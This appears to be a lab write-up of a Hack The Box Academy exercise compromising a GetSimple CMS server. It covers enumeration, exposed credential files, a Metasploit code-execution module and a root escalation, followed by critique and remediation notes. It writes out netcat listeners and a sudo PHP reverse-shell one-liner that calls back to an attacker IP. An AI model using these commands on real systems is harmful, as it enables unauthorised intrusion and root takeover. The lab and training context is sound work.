# Penetration Test Execution Log (HTB)

> Note: This document is based on your captured terminal/browser notes. Where outputs are missing (e.g., `sudo -l` output, Metasploit options), I call that out in **Critique / Missing Detail**.

## Engagement Summary

- **Date:** 2025-12-26
- **Context:** Hack The Box / HTB Academy lab exercises
- **Method:** Black-box enumeration → web exploitation → local privilege escalation

---

# Target 1: ACADEMY-GETSTART-SKILLS (GetSimple CMS)

## Target

- **IP:** `10.129.169.191`

## Recon & Enumeration

### Port scanning

Commands executed:

```bash
nmap -sV --open -oA kc_initial_scan 10.129.169.191
nmap -p- --open -oA kc_full_tcp_scan 10.129.169.191
nmap -sC -p 22,80 -oA kc_script_scan 10.129.169.191
nmap -sV --script=http-enum -oA kc_nmap_http_enum 10.129.169.191
```

Key results:

- **22/tcp (ssh):** OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
- **80/tcp (http):** Apache httpd 2.4.41 (Ubuntu)
- Nmap scripting indicated:
  - `robots.txt` disallows `/admin/`
  - page title: **“Welcome to GetSimple! - gettingstarted”**
  - directories of interest: `/admin/`, `/backups/`, `/data/`

Connectivity validation:

```bash
nc -nv 10.129.169.191 22
nc -nv 10.129.169.191 80
whatweb 10.129.169.191
curl http://10.129.169.191
```

### Content discovery

Command executed:

```bash
gobuster dir -u http://10.129.169.191 --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
```

Notable endpoints discovered:

- `/admin/`
- `/backups/`
- `/data/`
- `/plugins/`
- `/theme/`
- `/robots.txt`
- `/sitemap.xml`

### Web findings

- `robots.txt`:

```text
User-agent: *
Disallow: /admin/
```

- `sitemap.xml` referenced a virtual host:

```xml
<loc>http://gettingstarted.htb/</loc>
```

- **Directory listing enabled** (observed in browser):
  - `/theme/` (e.g., “cardinal” and “innovation” theme folders)
  - `/plugins/` (plugin files and folders visible)
  - `/data/` (sensitive application data exposed)

## Credential / Secret Discovery

### Admin hash exposure

From browsing:

- `http://10.129.169.191/data/users/admin.xml`

Observed content (excerpt):

```xml
<USR>admin</USR>
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
```

You identified:

- `d033e22ae348aeb5660fc2140aec35850c4da997` as a SHA1 hash of **`admin`**.

### API key exposure

From browsing:

- `http://10.129.169.191/data/other/authorization.xml`

Observed content:

```xml
<apikey>4f399dc72ff8e619e327800f851e9986</apikey>
```

### Administrative access

- Logged into `http://10.129.169.191/admin/` with **`admin:admin`**.
- Identified application as **GetSimple CMS**.

## Exploitation

### Initial approach

- Started a listener:

```bash
nc -lvnp 8123
```

- Attempted Metasploit module:
  - `unix/webapp/get_simple_cms_upload_exec` → **upload failed**

### Successful compromise

- Used Metasploit module:
  - `getsimplecms_unauth_code_exec` → obtained a **Meterpreter** session

Post-exploitation notes captured:

- Retrieved and submitted **user flag** (not included in the log)
- Checked sudo rights:
  - `sudo -l` showed PHP could be executed as root without password

## Privilege Escalation

- Started a new listener for root shell:

```bash
nc -lvnp 8456
```

- Executed PHP reverse shell as root:

```bash
sudo /usr/bin/php -r '$sock=fsockopen("10.10.14.122",8456);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Result:

- Root shell opened
- Retrieved **root flag** (not included in the log)

## Critique / Missing Detail (recommended additions)

For submission-quality documentation, these items would strengthen your report:

- **Scope/identity**: include attacker host IP and interface (you used `10.10.14.122` for callbacks), plus whether VPN was HTB.
- **VHost resolution**: you found `gettingstarted.htb` in the sitemap, but the log doesn’t show whether you added `/etc/hosts` or tested Host headers.
- **Evidence of directory listing**: capture one example response (e.g., `curl -I` or screenshot) showing `Index of /data/`.
- **Credential derivation**: show how you confirmed the SHA1 (e.g., `hashid`, `sha1sum`, `john`/`hashcat`) rather than stating it.
- **Metasploit reproducibility**:
  - record module **full name**, **options**, and **target URI** you used (e.g., `RHOSTS`, `RPORT`, `TARGETURI`, `LHOST`, `LPORT`).
  - include the key session output proving code execution (e.g., `getuid`, `sysinfo`).
- **User flag / root flag proof**: if allowed by your course, include the `cat` command and the hash output as evidence.
- **`sudo -l` proof**: paste the exact `sudo -l` output showing the PHP allowance.
- **Root shell evidence**: add `whoami`, `id`, and `hostname` output after escalation.

## Remediation Notes (high-level)

- Disable directory listing on the web server.
- Restrict access to CMS data directories (e.g., `/data/`) and backups.
- Enforce strong admin password policy; avoid default credentials.
- Rotate exposed API keys and secrets.
- Remove/limit passwordless `sudo` rules (especially interpreters like PHP).


